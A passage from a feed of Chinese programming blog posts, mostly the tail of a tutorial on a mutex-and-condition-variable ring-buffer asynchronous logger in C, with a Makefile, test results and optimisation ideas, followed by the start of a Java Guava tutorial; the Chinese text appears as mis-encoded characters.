<span class="hljs-type">void</span> *<span class="hljs-title function_">pthread_producer2</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>
{
    RingBuffer *rb = (RingBuffer *)arg;
â€‹
    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1000</span>;i++)
    {
        <span class="hljs-type">char</span> buf[<span class="hljs-number">64</span>];
â€‹
        <span class="hljs-built_in">snprintf</span>(buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-string">"Producer2 code:%d\n"</span>, i);
â€‹
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Producer2 pushing:%s\n"</span>,buf);
â€‹
        log_push(rb,buf);
â€‹
        usleep(<span class="hljs-number">100</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}
â€‹
<span class="hljs-type">void</span> *<span class="hljs-title function_">pthread_consumer</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span>
{
    RingBuffer *rb = (RingBuffer *)arg;
    Log entry;
    <span class="hljs-keyword">while</span>(rb_pop(rb,&amp;entry))<span class="hljs-comment">//å¾ªç¯æ£€æµ‹è¿”å›å€¼ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯è¦é€€å‡º</span>
    {
        write(rb-&gt;file_fd,entry.data,<span class="hljs-built_in">strlen</span>(entry.data));
    }
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æ¶ˆè´¹è€…çº¿ç¨‹ï¼šä¼˜é›…é€€å‡º\n"</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;
}
â€‹
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
{
    RingBuffer rb;
â€‹
    rb_init(&amp;rb,<span class="hljs-number">10</span>);
â€‹
    rb.file_fd = open(FILE_NAME,O_RDWR|O_CREAT|O_APPEND,<span class="hljs-number">0644</span>);
    <span class="hljs-keyword">if</span>(rb.file_fd == <span class="hljs-number">-1</span>)
    {
        perror(<span class="hljs-string">"æ–‡ä»¶æ‰“å¼€å¤±è´¥"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
â€‹
    <span class="hljs-type">pthread_t</span> consumer,producer1,producer2;
    pthread_create(&amp;consumer,<span class="hljs-literal">NULL</span>,pthread_consumer,(<span class="hljs-type">void</span> *)&amp;rb);
    pthread_create(&amp;producer1,<span class="hljs-literal">NULL</span>,pthread_producer1,(<span class="hljs-type">void</span> *)&amp;rb);
    pthread_create(&amp;producer2,<span class="hljs-literal">NULL</span>,pthread_producer2,(<span class="hljs-type">void</span> *)&amp;rb);
â€‹
    pthread_join(producer1,<span class="hljs-literal">NULL</span>);
    pthread_join(producer2,<span class="hljs-literal">NULL</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æ‰€æœ‰ç”Ÿäº§è€…å·²ç»ç»“æŸä»»åŠ¡\n"</span>);
â€‹
    rb_stop(&amp;rb);
    pthread_join(consumer,<span class="hljs-literal">NULL</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"æ¶ˆè´¹è€…å·²ç»é€€å‡º\n"</span>);
â€‹
    close(rb.file_fd);
    rb_destroy(&amp;rb);
 Â  Â 
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>ç”±äºç¯‡å¹…å·²ç»æ¯”è¾ƒé•¿äº†ï¼Œä¸‹é¢æˆ‘ç›´æ¥è´´å‡º Makefile ï¼š</p>
<pre><code class="hljs language-makefile" lang="makefile">CC = gcc
CFLAGS = -Wall -g -pthread
â€‹
TARGET = app
SRCS = main.c ring_buffer.c
OBJS = $(SRCS:.c=.o)
â€‹
<span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span></span>
â€‹
<span class="hljs-variable">$(TARGET)</span>: <span class="hljs-variable">$(OBJS)</span>
    <span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> -o <span class="hljs-variable">$(TARGET)</span> <span class="hljs-variable">$(OBJS)</span>
â€‹
<span class="hljs-section">%.o: %.c ring_buffer.h</span>
    <span class="hljs-variable">$(CC)</span> <span class="hljs-variable">$(CFLAGS)</span> -c <span class="hljs-variable">$&lt;</span> -o <span class="hljs-variable">$@</span>
â€‹
â€‹
<span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean test</span>
â€‹
<span class="hljs-section">clean:</span>
    rm -f <span class="hljs-variable">$(OBJS)</span> <span class="hljs-variable">$(TARGET)</span> log.txt
â€‹
<span class="hljs-section">test: <span class="hljs-variable">$(TARGET)</span></span>
    ./<span class="hljs-variable">$(TARGET)</span>
â€‹
</code></pre>
<p>ç®€å•ä»‹ç»ä¸€ä¸‹æ€ä¹ˆä½¿ç”¨ï¼Œé¦–å…ˆå‘½ä»¤è¡Œè¾“å…¥makeè¿›è¡Œç¼–è¯‘ï¼Œç„¶åè¾“å…¥./appè¿è¡Œç¨‹åºã€‚æˆ–è€…å«Œéº»çƒ¦çš„å¯ä»¥ç›´æ¥å‘½ä»¤è¡Œè¾“å…¥make testï¼Œè¿™ä¼šç›´æ¥ç¼–è¯‘å¹¶ä¸”è¿è¡Œç¨‹åºã€‚è¿è¡Œå®Œæˆåå¯ä»¥ä½¿ç”¨make cleanæ¸…é™¤ç¨‹åºè¿è¡Œäº§ç”Ÿçš„æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-23">5.2 æµ‹è¯•ç»“æœéªŒè¯</h3>
<p>è¿è¡Œä¹‹åç»ˆç«¯è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ea5248382774f89b4c9d3136e06afdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=9XAYDK424GhAtbqI%2FYGTslXB4jI%3D" alt="ç»ˆç«¯è¿è¡Œç»“æœ1.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82c875e35c244b999d2d65d1c4254a9a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=OolOP7ml7YuWIaMwN7he370%2BRQc%3D" alt="ç»ˆç«¯è¿è¡Œç»“æœ2.png" loading="lazy"/></p>
<p>ç”±äºæˆ‘åœ¨ä¸¤ä¸ªç”Ÿäº§è€…ä¸­éƒ½æ·»åŠ äº†<code>printf</code>å‡½æ•°ï¼Œæ‰€ä»¥åœ¨ç»ˆç«¯ä¼šçœ‹åˆ°ä»–ä»¬æ‰“å°å‡ºæ¥çš„å†…å®¹ï¼Œæ€»å…±2000æ¡ï¼Œæˆ‘åªæˆªå›¾äº†æœ€å‰é¢å’Œæœ€åé¢çš„éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»<strong>å®ç°äº†ä¼˜é›…é€€å‡º</strong>ï¼ˆç”Ÿäº§è€…å…¨éƒ¨é€€å‡ºåï¼Œæ¶ˆè´¹è€…è‡ªåŠ¨é€€å‡ºï¼‰ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å†æ¥æŸ¥çœ‹ä¸€ä¸‹æ—¥å¿—å†…å®¹æ˜¯å¦å­˜æ”¾åˆ°äº† log.txt é‡Œé¢ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c80bd751d6914d57a3084604c2530846~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=od0ZKrt2fMOBKJvPbGvjx%2B2Yib4%3D" alt="log.txtå‰é¢.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/49f10a6da1484d768bbe7a38c4724968~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=dFx8gDe5MYtcgsLj5MyNsU6U01k%3D" alt="log.txtåé¢.png" loading="lazy"/></p>
<p>æˆ‘ä»¬åŒæ ·åªæˆªå»æœ€å‰é¢å’Œæœ€åé¢çš„éƒ¨åˆ†ï¼Œä¸¤ä¸ªç”Ÿäº§è€…çº¿ç¨‹äº§ç”Ÿçš„æ—¥å¿—å†…å®¹éƒ½æ˜¯ä»0-999ï¼Œä¹Ÿå°±æ˜¯å„1000ä¸ªï¼Œæ€»å…±2000ä¸ªã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61e8d32684484e5fa04a1415e3db3f76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGxwNjY2aHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766147788&amp;x-signature=mgni668%2Bbdx2YAFJU6yBGRQBp2s%3D" alt="æ—¥å¿—è¡Œæ•°.png" loading="lazy"/></p>
<p>å†æ¥æŸ¥çœ‹ log.txt æ–‡ä»¶çš„è¡Œæ•°ï¼Œå‘ç°ä¹Ÿæ˜¯2000è¡Œã€‚è¿™è¶³ä»¥è¯´æ˜<strong>ä¸€æ¡æ—¥å¿—éƒ½æ²¡æœ‰ä¸¢å¤±</strong>ã€‚</p>
<p>ç»“æœåˆ†æï¼šåœ¨å®¹é‡ä»…ä¸º 10 çš„æƒ…å†µä¸‹ï¼Œ2000 æ¡æ—¥å¿—å…¨éƒ¨è½ç›˜ï¼Œè¯æ˜<strong>æ¡ä»¶å˜é‡çš„ <code>wait</code> &amp; <code>signal</code> é€»è¾‘</strong>å¾ˆä¸¥å¯†ã€‚ä¸»çº¿ç¨‹æˆåŠŸç­‰å¾…æ‰€æœ‰å­çº¿ç¨‹ç»“æŸï¼Œè¯æ˜<strong>ä¼˜é›…é€€å‡º</strong>æœºåˆ¶ç”Ÿæ•ˆï¼Œæ²¡æœ‰çº¿ç¨‹å¡åœ¨ <code>wait</code> çŠ¶æ€ã€‚ä»ç»ˆç«¯è¾“å‡ºå¯ä»¥çœ‹åˆ°ï¼Œä¸¤ä¸ªç”Ÿäº§è€…<strong>äº¤æ›¿æŠ¢å </strong>æ—¶é—´ç‰‡ï¼Œè¯æ˜<strong>äº’æ–¥é”</strong>æœ‰æ•ˆä¿æŠ¤äº†ä¸´ç•ŒåŒºã€‚</p>
<h3 data-id="heading-24">5.3 é¡¹ç›®æ€»ç»“ä¸æ€è€ƒ</h3>
<p>ä»æœ€å¼€å§‹ç®€å•çš„æ¯äº§ç”Ÿä¸€æ¡æ—¥å¿—å°±ç”¨ <code>write</code> ç›´æ¥å†™ç›˜ï¼Œåˆ°æœ€ç»ˆå®Œæˆè¿™ä¸ª<strong>å¼‚æ­¥æ—¥å¿—åº“</strong>ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸ä»…ä»…æ˜¯ä»£ç é‡çš„å¢åŠ ï¼Œæ›´æ˜¯<strong>å·¥ç¨‹æ€ç»´</strong>çš„æå‡ã€‚ä¸‹é¢æ˜¯æˆ‘åœ¨æ•´ä¸ªè¿‡ç¨‹ä¸­çš„ä¸€äº›æ€è€ƒï¼š</p>
<h4 data-id="heading-25">5.3.1 å‘ç¡¬ä»¶ç‰©ç†ç‰¹æ€§å¦¥å</h4>
<p>æœ‰äººå¯èƒ½æ›´å…³æ³¨ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦ï¼Œä½†åœ¨åµŒå…¥å¼åº•å±‚å¼€å‘ä¸­ï¼Œ<strong>ç¡¬ä»¶ç‰¹æ€§</strong>æ‰æ˜¯æ€§èƒ½çš„å¤©èŠ±æ¿ã€‚</p>
<p>æ”¾å¼ƒé“¾è¡¨é€‰æ‹© <strong>Ring Buffer</strong>ï¼Œä¸ä»…ä»…æ˜¯ä¸ºäº†ç®¡ç†æ–¹ä¾¿ï¼Œæ›´æ˜¯ä¸ºäº†<strong>ç¡®å®šæ€§</strong>ã€‚åœ¨é•¿æœŸè¿è¡Œçš„åµŒå…¥å¼ç³»ç»Ÿä¸­ï¼Œé¿å…é¢‘ç¹ <code>malloc/free</code> é€ æˆçš„å †å†…å­˜ç¢ç‰‡æ˜¯ç³»ç»Ÿç¨³å®šçš„åŸºçŸ³ã€‚</p>
<p>åˆ©ç”¨æ•°ç»„çš„<strong>ç©ºé—´å±€éƒ¨æ€§</strong>ï¼Œå¤§å¹…å‡å°‘ <strong>Cache Miss</strong>ï¼Œè®© CPU æµæ°´çº¿è·‘å¾—æ›´é¡ºç•…ã€‚</p>
<h4 data-id="heading-26">5.3.2 è§£è€¦ä¸å‰Šå³°å¡«è°·</h4>
<p>åˆ©ç”¨ <strong>ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹</strong> ï¼Œå°†ä¸šåŠ¡é€»è¾‘ï¼ˆå¿«ï¼‰ä¸ç£ç›˜ I/Oï¼ˆæ…¢ï¼‰å½»åº•åˆ†ç¦»ã€‚</p>
<p><code>Ring Buffer</code> åœ¨è¿™é‡Œæ‰®æ¼”äº†â€œè“„æ°´æ± â€çš„è§’è‰²ã€‚é¢å¯¹çªå‘æµé‡ï¼Œç¼“å†²åŒºèƒ½èµ·åˆ°<strong>å‰Šå³°å¡«è°·</strong>çš„ä½œç”¨ï¼Œé˜²æ­¢ç¬é—´çš„é«˜é¢‘ I/O è¯·æ±‚å°†ç³»ç»Ÿæ‹–å®ã€‚</p>
<p>è™½ç„¶ä½¿ç”¨äº†äº’æ–¥é”ï¼Œä½†é…åˆ<strong>æ¡ä»¶å˜é‡</strong> é¿å…äº†å¿™ç­‰å¾…ï¼Œåœ¨ä¿è¯æ•°æ®å®‰å…¨çš„åŒæ—¶ï¼Œæœ€å¤§ç¨‹åº¦é™ä½äº† CPU å ç”¨ç‡ã€‚</p>
<h4 data-id="heading-27">5.3.3 é˜²å¾¡æ€§ç¼–ç¨‹ä¸ç”Ÿå‘½å‘¨æœŸ</h4>
<p>å…¨é¢ç¦ç”¨ <code>strcpy/sprintf</code>ï¼Œä¸¥æ ¼ä½¿ç”¨ <code>snprintf</code> é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºã€‚</p>
<p>å®ç°äº†<strong>ä¼˜é›…é€€å‡º</strong> æœºåˆ¶ã€‚é€šè¿‡ <code>is_running</code> æ ‡å¿—ä½å’Œå¹¿æ’­å”¤é†’ï¼Œç¡®ä¿ç¨‹åºé€€å‡ºæ—¶ï¼Œç¼“å†²åŒºå†…æ®‹ç•™çš„æ—¥å¿—èƒ½è¢«<strong>å…¨éƒ¨æ¶ˆè´¹</strong>ï¼Œåšåˆ°æ•°æ®é›¶ä¸¢å¤±ã€‚</p>
<p>é€šè¿‡ç»“æ„ä½“å°è£…æ–‡ä»¶æè¿°ç¬¦ä¸äº’æ–¥é”å’Œæ¡ä»¶å˜é‡ï¼Œå®ç°äº†é«˜å†…èšä½è€¦åˆï¼Œæ‹’ç»å…¨å±€å˜é‡çš„æ±¡æŸ“ã€‚</p>
<h3 data-id="heading-28">5.4 è¿›é˜¶ä¼˜åŒ–æ–¹å‘</h3>
<p>è™½ç„¶ç›®å‰çš„ç‰ˆæœ¬å·²ç»æ˜¯ä¸€ä¸ª<strong>ç¨³å®šã€é«˜æ•ˆ</strong>çš„å¼‚æ­¥æ—¥å¿—åº“ï¼Œä½†åœ¨é¢å¯¹æ›´è‹›åˆ»çš„å·¥ä¸šçº§åœºæ™¯ï¼ˆå¦‚è½¦è§„çº§åµŒå…¥å¼ã€é«˜é¢‘äº¤æ˜“ç³»ç»Ÿï¼‰æ—¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªç»´åº¦è¿›è¡Œæ·±åº¦ä¼˜åŒ–ï¼š</p>
<h4 data-id="heading-29">5.4.1 æ‰¹é‡å†™å…¥ä¸é¡µç¼“å­˜å¯¹é½</h4>
<p>å‰é¢å·²ç»æåˆ°æ‰¹é‡å†™å…¥çš„å†…å®¹ï¼Œå¦‚æœé‡‡ç”¨æ‰¹é‡å†™å…¥ï¼Œè¿˜èƒ½åœ¨æœ¬é¡¹ç›®çš„åŸºç¡€ä¸ŠæŠŠ<strong>æ€§èƒ½è¿›ä¸€æ­¥å‹æ¦¨</strong>ã€‚è€Œç›®å‰çš„å®ç°æ˜¯æ¶ˆè´¹è€…æ¯æ¬¡ <code>Pop</code> ä¸€æ¡æ—¥å¿—å°±è°ƒç”¨ä¸€æ¬¡ <code>write</code> ã€‚</p>
<p>è€Œ <code>write</code> æ˜¯ç³»ç»Ÿè°ƒç”¨ï¼Œæ¶‰åŠ<strong>ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„ä¸Šä¸‹æ–‡åˆ‡æ¢</strong>ï¼Œå­˜åœ¨ç€å·¨å¤§çš„å¼€é”€ã€‚</p>
<p>ä¼˜åŒ–æ€è·¯ï¼šåœ¨æ¶ˆè´¹è€…çº¿ç¨‹å†…éƒ¨ç»´æŠ¤ä¸€ä¸ª <strong>4KBï¼ˆä¸€é¡µå†…å­˜ï¼‰</strong> çš„ä¸­é—´ç¼“å†²åŒºã€‚å½“ç§¯æ”’çš„æ•°æ®è¾¾åˆ° 4KB æˆ–è€…è¶…æ—¶ï¼ˆå¯ä»¥è‡ªå·±è®¾å®šä¸€ä¸ªæ—¶é—´ï¼‰æ—¶ï¼Œå†ä¸€æ¬¡æ€§è°ƒç”¨ <code>write</code> è½ç›˜ã€‚è¿™èƒ½å°†ç³»ç»Ÿè°ƒç”¨çš„é¢‘ç‡é™ä½ä¸€ä¸ªæ•°é‡çº§ï¼Œå¹¶æ›´å¥½åœ°åˆ©ç”¨æ–‡ä»¶ç³»ç»Ÿçš„ <strong>Page Cache</strong>ã€‚</p>
<h4 data-id="heading-30">5.4.2 å­˜å‚¨ç®¡ç†</h4>
<p>åµŒå…¥å¼è®¾å¤‡çš„å­˜å‚¨ç©ºé—´ï¼ˆFlash/SDå¡ï¼‰æ˜¯æœ‰é™çš„ï¼Œæˆ‘ä»¬ä¸èƒ½è®© log.txt æ— é™å¢é•¿ã€‚</p>
<p>ä¼˜åŒ–æ€è·¯ï¼šå½“ log.txt è¾¾åˆ° 10MB æ—¶ï¼Œè‡ªåŠ¨å°†å…¶é‡å‘½åä¸º log.txt.1ï¼Œå¹¶åˆ›å»ºæ–°çš„ log.txtã€‚å¯ä»¥ä¿ç•™æœ€è¿‘ N ä¸ªå¤‡ä»½ï¼Œè‡ªåŠ¨åˆ é™¤æœ€æ—§çš„æ—¥å¿—ï¼Œé˜²æ­¢ç£ç›˜å†™æ»¡å¯¼è‡´ç³»ç»Ÿå´©æºƒã€‚</p>
<h4 data-id="heading-31">5.4.3 æ— é”é˜Ÿåˆ—</h4>
<p>ç›®å‰çš„å®ç°ä½¿ç”¨äº† <code>Mutex</code> + <code>Cond</code>ã€‚åœ¨æé«˜å¹¶å‘ï¼ˆå‡ åä¸ªçº¿ç¨‹åŒæ—¶å†™å…¥ï¼‰ä¸‹ï¼Œé”ç«äº‰ä¼šå¯¼è‡´ CPU ä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€å¢å¤§ã€‚</p>
<p>ä¼˜åŒ–æ€è·¯ï¼šå‚è€ƒ Linux å†…æ ¸ <strong>kfifo</strong> çš„å®ç°ï¼Œåˆ©ç”¨ <strong>åŸå­æ“ä½œ</strong> å’Œ <strong>å†…å­˜å±éšœ</strong> æ¥ç®¡ç† head å’Œ tail æŒ‡é’ˆã€‚æœ€ç»ˆç›®æ ‡æ˜¯å®ç°<strong>å•ç”Ÿäº§è€…-å•æ¶ˆè´¹è€…</strong>æ¨¡å¼ä¸‹çš„å®Œå…¨æ— é”ï¼Œæˆ–<strong>å¤šç”Ÿäº§è€…</strong>æ¨¡å¼ä¸‹çš„æ— é”å…¥é˜Ÿï¼Œå°†æ€§èƒ½å‹æ¦¨åˆ°ç‰©ç†æé™ã€‚</p>
<h4 data-id="heading-32">5.4.4 é›¶æ‹·è´</h4>
<p>å½“å‰çš„ <code>log_push</code> æ¶‰åŠä¸¤æ¬¡æ‹·è´ï¼ˆ<code>snprintf</code> åˆ°æ ˆï¼Œ<code>memcpy</code> åˆ° <code>RingBuffer</code>ï¼‰ã€‚</p>
<p>ä¼˜åŒ–æ€è·¯ï¼šè®¾è®¡å‡½æ•°æ¥å£å…è®¸ä¸šåŠ¡çº¿ç¨‹ç›´æ¥åœ¨ RingBuffer çš„å†…å­˜åŒºåŸŸå†…è¿›è¡Œæ ¼å¼åŒ–å†™å…¥ï¼ˆé€šè¿‡è¿”å›å†™æŒ‡é’ˆï¼‰ï¼Œçœå»ä¸­é—´çš„æ ˆå†…å­˜æ‹·è´è¿‡ç¨‹ï¼Œè¿›ä¸€æ­¥é™ä½å†…å­˜å¸¦å®½å ç”¨ã€‚</p>
<h2 data-id="heading-33">6. é¡¹ç›®æºç </h2>
<p><em><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxlp666hub%2FAsyncLog-RingBuffer" target="_blank" title="https://github.com/xlp666hub/AsyncLog-RingBuffer" ref="nofollow noopener noreferrer">ğŸ‘‰ <strong>ç‚¹å‡»è·³è½¬åˆ° GitHub ä»“åº“</strong></a></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Guavaå·¥å…·åº“å®æˆ˜]]></title>    <link>https://juejin.cn/post/7582846276505960486</link>    <guid>https://juejin.cn/post/7582846276505960486</guid>    <pubDate>2025-12-13T00:37:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582846276505960486" data-draft-id="7582849187864903731" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Guavaå·¥å…·åº“å®æˆ˜"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-13T00:37:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é›¨ä¸­é£˜è¡çš„è®°å¿†"/> <meta itemprop="url" content="https://juejin.cn/user/694547077666606"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Guavaå·¥å…·åº“å®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547077666606/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é›¨ä¸­é£˜è¡çš„è®°å¿†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T00:37:25.000Z" title="Sat Dec 13 2025 00:37:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Guavaå·¥å…·åº“å®æˆ˜ï¼šMapã€Listã€Splitterã€Joineré«˜æ•ˆä½¿ç”¨</h2>
